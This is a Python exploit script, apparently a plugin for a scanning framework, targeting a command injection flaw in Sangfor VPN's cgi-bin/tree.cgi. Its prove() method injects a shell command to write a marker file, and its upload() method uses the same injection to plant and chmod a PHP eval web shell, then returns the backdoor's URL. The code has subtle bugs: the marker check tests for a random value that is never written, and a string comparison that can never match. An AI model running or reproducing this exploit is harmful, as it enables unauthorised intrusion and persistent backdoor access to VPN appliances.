#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import random
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    sangfor vpn rce
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                test = str(random.randint(100000, 999999))
                cmd = "echo -n -e 'test'>/etc/db/svpnrcico/.svpn_index.txt"
                url = self.base_url + "cgi-bin/tree.cgi?a=';%s;'a" % cmd
                async with session.get(url=url) as res:
                    if res:
                        url = self.base_url + "cgi-bin/php-cgi/html/svpnrcico/.svpn_index.txt"
                        async with session.get(url=url) as res:
                            if res:
                                text = await res.text()
                                if res != None and res.status == 200 and test in text:
                                    yield url

    async def upload(self):
        if self.base_url and self.base_url[0:7]=='https://':
            async with ClientSession() as session:
                cmd = "echo -n -e '<?php eval($_POST[1]);?>'>/etc/db/svpnrcico/.svpn_index.php"
                url = self.base_url + "cgi-bin/tree.cgi?a=';%s;'a" % cmd
                async with session.get(url=url) as res:
                    if res != None:
                        cmd = "chmod 755 /etc/db/svpnrcico/.svpn_index.php"
                        url = self.base_url  + "cgi-bin/tree.cgi?a=';%s;'a" % cmd
                        async with session.get(url=url) as res:
                            if res!=None:
                                url = self.base_url + "cgi-bin/php-cgi/html/svpnrcico/.svpn_index.php"
                                async with session.get(url=url) as res:
                                    if res != None and res.status ==200 :
                                        yield url + "?pass=1"
